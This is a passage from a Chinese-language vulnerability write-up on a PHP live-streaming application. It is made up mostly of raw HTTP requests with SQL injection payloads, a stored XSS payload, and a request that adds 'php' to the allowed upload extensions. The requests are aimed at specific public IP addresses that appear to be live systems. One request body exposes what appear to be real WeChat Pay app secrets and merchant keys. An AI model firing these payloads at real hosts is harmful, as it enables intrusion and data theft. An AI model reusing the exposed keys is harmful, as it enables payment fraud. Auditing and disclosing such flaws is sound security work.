<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/user/pass_record</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>222.162.139.12:9100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">ids</span>%<span class="number">5</span>B%<span class="number">5</span>D=<span class="number">1</span>/if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">116</span>,<span class="number">1</span>,exp(<span class="number">710</span>))</span></span><br></pre></td></tr></table></figure>

<p>定位过去</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppFgO9x"><img src="https://s1.ax1x.com/2023/03/02/ppFgO9x.png" alt="ppFgO9x.png"></a></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/aa2209cba7f4a6b7.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/dc80a5375e13dba8.png"></p>
<p>2）SQL * 2</p>
<p>同理，这个refuse_record的地方也有注入</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/69405eab40cd8a8c.png"></p>
<p>3）SQL * 3</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/appadmin/approve/index_data?status=&amp;resource_dirs=1-extractvalue(1,concat(char(126),database()))&amp;title=&amp;pagelimit=10&amp;pagecurr=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/0c82b5c74d0d3d8d.png"></p>
<p>紧接着下面就直接SQL了，而不是用模型单独执行SQL，有点不规范…</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/f6fe6062227eb6df.png"></p>
<p>.</p>
<p>4）SQL * 4</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>251</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">name<span class="operator">=</span><span class="variable">%E5</span><span class="variable">%B9</span><span class="variable">%BF</span><span class="variable">%E4</span><span class="variable">%BF</span><span class="variable">%A1</span><span class="variable">%E5</span><span class="variable">%8</span>C<span class="variable">%BA</span><span class="variable">%E8</span><span class="variable">%81</span><span class="variable">%8</span>C<span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%9</span>A<span class="variable">%E6</span><span class="variable">%8</span>A<span class="variable">%80</span><span class="variable">%E6</span><span class="variable">%9</span>C<span class="variable">%AF</span><span class="variable">%E5</span><span class="variable">%AD</span><span class="variable">%A6</span><span class="variable">%E6</span><span class="variable">%A0</span><span class="variable">%A1</span>&amp;url<span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span>&amp;remark<span class="operator">=</span><span class="variable">%E5</span><span class="variable">%B9</span><span class="variable">%BF</span><span class="variable">%E4</span><span class="variable">%BF</span><span class="variable">%A1</span><span class="variable">%E5</span><span class="variable">%8</span>C<span class="variable">%BA</span><span class="variable">%E8</span><span class="variable">%81</span><span class="variable">%8</span>C<span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%9</span>A<span class="variable">%E6</span><span class="variable">%8</span>A<span class="variable">%80</span><span class="variable">%E6</span><span class="variable">%9</span>C<span class="variable">%AF</span><span class="variable">%E5</span><span class="variable">%AD</span><span class="variable">%A6</span><span class="variable">%E6</span><span class="variable">%A0</span><span class="variable">%A1</span>&amp;tag<span class="operator">=</span><span class="number">1</span>&#x27;<span class="keyword">and</span>/**/<span class="keyword">extractvalue</span>(<span class="number">1</span><span class="punctuation">,</span>concat(char(<span class="number">126</span>)<span class="punctuation">,</span>database()))<span class="keyword">and</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/fc856a173e823296.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/dd3962cf9abc1bb1.png"></p>
<p>这里的setField就是保存，也就是我们$data通过post方式传过去配合这个tag用来修改这个表sys_config的某些配置内容</p>
<p>下面紧接着就是如果我们的tag = com.domain，也就是某个字段，就将我们传入的url执行文件写入到web_site.txt中，如果有文件包含漏洞可以利用一手</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppFRCsU"><img src="https://s1.ax1x.com/2023/03/02/ppFRCsU.png" alt="ppFRCsU.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppFRFZ4"><img src="https://s1.ax1x.com/2023/03/02/ppFRFZ4.png" alt="ppFRFZ4.png"></a></p>
<p>可惜文件名不可控</p>
<p>另外一说，由于这个sys_config所接受的post是任意post上来的参数，目的就是为了篡改这个表中的信息，所以其中可修改任意文件上传的后缀</p>
<p>5）SQL * 5</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>136</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">file_exe</span>=wmv%<span class="number">2</span>Cavi%<span class="number">2</span>Casf%<span class="number">2</span>Crmvb%<span class="number">2</span>Cmov%<span class="number">2</span>Cmp4%<span class="number">2</span>Cmkv%<span class="number">2</span>Cflv%<span class="number">2</span>Cvob%<span class="number">2</span>Cphp&amp;file_num=<span class="number">20</span>&amp;file_format_size=<span class="number">1</span>&amp;file_max_size=<span class="number">8</span>&amp;tag=<span class="number">1</span>&#x27;and/**/extractvalue(<span class="number">1</span>,concat(char(<span class="number">126</span>),database()))and&#x27;</span></span><br></pre></td></tr></table></figure>



<p>6）SQL * 6</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>142</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">file_exe</span>=ppt%<span class="number">2</span>Cpptx%<span class="number">2</span>Cdoc%<span class="number">2</span>Cdocx%<span class="number">2</span>Cxls%<span class="number">2</span>Cxlsx%<span class="number">2</span>Ctxt%<span class="number">2</span>Cpdf%<span class="number">2</span>Crar%<span class="number">2</span>Cphp&amp;file_num=<span class="number">10</span>&amp;file_format_size=<span class="number">0</span>.<span class="number">5</span>&amp;file_max_size=<span class="number">5</span>&amp;tag=<span class="number">1</span>&#x27;and/**/extractvalue(<span class="number">1</span>,concat(char(<span class="number">126</span>),database()))and&#x27;</span></span><br></pre></td></tr></table></figure>



<p>7）SQL * 7</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>70</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">socket_url</span>=<span class="number">127.0.0.1</span>&amp;socket_port=<span class="number">8585</span>&amp;socket_port2=<span class="number">1236</span>&amp;tag=com.socket</span></span><br></pre></td></tr></table></figure>

<p>8）SQL * 8</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>289</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">weixin</span>%<span class="number">5</span>Bappid%<span class="number">5</span>D=wxc1b6b345acf4db70&amp;weixin%<span class="number">5</span>Bsecret%<span class="number">5</span>D=<span class="number">9099</span>b7cbe8b2a96d856ed5ea4fb47a55&amp;weixin%<span class="number">5</span>Bmchid%<span class="number">5</span>D=<span class="number">1278808401</span>&amp;weixin%<span class="number">5</span>Bmchkey%<span class="number">5</span>D=d6421fe9d4a6ff67ccdc0f203bbc118c&amp;weixin%<span class="number">5</span>Benable%<span class="number">5</span>D=<span class="number">1</span>&amp;alipay%<span class="number">5</span>Bappid%<span class="number">5</span>D=<span class="number">22</span>&amp;alipay%<span class="number">5</span>Bsecret%<span class="number">5</span>D=<span class="number">2323</span>&amp;alipay%<span class="number">5</span>Benable%<span class="number">5</span>D=<span class="number">1</span>&amp;payment_enable=<span class="number">1</span>&amp;tag=com.payment</span></span><br></pre></td></tr></table></figure>



<p>9）SQL * 9</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/group/addto</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">title</span>=<span class="number">1</span>%<span class="number">27</span>-extractvalue%<span class="number">281</span>%<span class="number">2</span>Cconcat%<span class="number">28</span>char%<span class="number">28126</span>%<span class="number">29</span>%<span class="number">2</span>Cdatabase%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>-%<span class="number">27</span>&amp;desc=<span class="number">123</span>&amp;gid=<span class="number">1</span>&amp;power=<span class="number">1</span>&amp;pagepower=<span class="number">123</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/106676ec0c723bf3.png"></p>
<hr>
<p>10）SQL * 10</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/group/mstatus</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">gid</span>=1&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/e97ce7cc61fed60e.png"></p>
<p>这里也是直接拼接执行了没用任何过滤，但是并没有成功，猜测是SQL语句出问题了…</p>
<hr>
<p>11）SQL * 11</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/sys/addto</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>104</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">title</span>=<span class="number">1</span>&amp;tag=&#x27;-extractvalue(<span class="number">1</span>,concat(char(<span class="number">126</span>),database()))-&#x27;&amp;value=<span class="number">1</span>&amp;cid=<span class="number">21</span>&amp;id=<span class="number">1</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/ec8325b3384c1dd3.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/f4e839360963b4a4.png"></p>
<p>同样的，这里的id因为I方法自带的intval被过滤就不存在SQL注入了</p>
<h5 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h5><p>上面的后台SQL是因为后台限制了几个特殊路由需要登陆</p>
<p>1）SQL * 1</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/api/live_state_notice?info[0]=1&#x27;and/**/extractvalue(1,concat(char(126),database()))and&#x27;&amp;info[3]=2&amp;info[2]=3</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/a4063173abd8784a.png"></p>
<p>2）</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/api/live_state_notice?info[0]=1&amp;info[3]=1&#x27;and/**/extractvalue(1,concat(char(126),database()))and&#x27;&amp;info[2]=3</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/837ca481dd91bc03.png"><img src="https://s3.bmp.ovh/imgs/2023/03/02/921a58708c3fcb84.png"></p>
<p>.</p>
<p>3）SQL * 3</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/unionapi/live/push?auth_id=1%27and/**/extractvalue(1,concat(char(126),database()))and%27</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/03/02/5d788c6f51d790390efc0ca8f55c7ac1.png" alt="5d788c6f51d790390efc0ca8f55c7ac1.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/03/02/4cb221aa97b099fb710996dc1e544d67.png" alt="4cb221aa97b099fb710996dc1e544d67.png"></p>
<p>定位到模型执行了getSlaveSite方法，SQL + 1</p>
<p><img src="https://s1.imagehub.cc/images/2023/03/02/efdd5eef641a579cc24d8f80498506ab.png" alt="efdd5eef641a579cc24d8f80498506ab.png"></p>
<p>4） SQL * 4</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/live/1&#x27;)%20UNION%20ALL%20SELECT%20NULL,database(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/03/02/498d448f2877cab9c1bacb83959c4700.png" alt="498d448f2877cab9c1bacb83959c4700.png"></p>
<h4 id="存储XSS篇"><a href="#存储XSS篇" class="headerlink" title="存储XSS篇"></a>存储XSS篇</h4><p>1）存储 * 1</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/2f368cbef5213bda.png"></p>
<p>这里是取sys_config表中com.domain字段下的url的值，并且循环变量输出，我们就要定位到修改com.domain字段的地方</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/d21bfd1022bf7264.png"></p>
<p>这里我们传入参数给data之后经过setField保存起来后，下面就是当tag=com.domain执行一个写入操作</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>231</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">url</span>=%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E&amp;tag=com.domain</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/3d5a110347d9a04d.png"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/appinterface/getbanner</span><br></pre></td></tr></table></figure>

<p>2）存储 * 2</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/ac72004487079f1e.png"></p>
<p>这里我们传入的type被过滤，然后url和上一个一样，当type=fine的时候</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/03/02/ad2483474bc88eea.png"></p>
<p>会遍历取出，在cover这里，和上一个是一样的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.77.154.178:1980/home/appinterface/getindexdata?type=fine</span><br></pre></td></tr></table></figure>

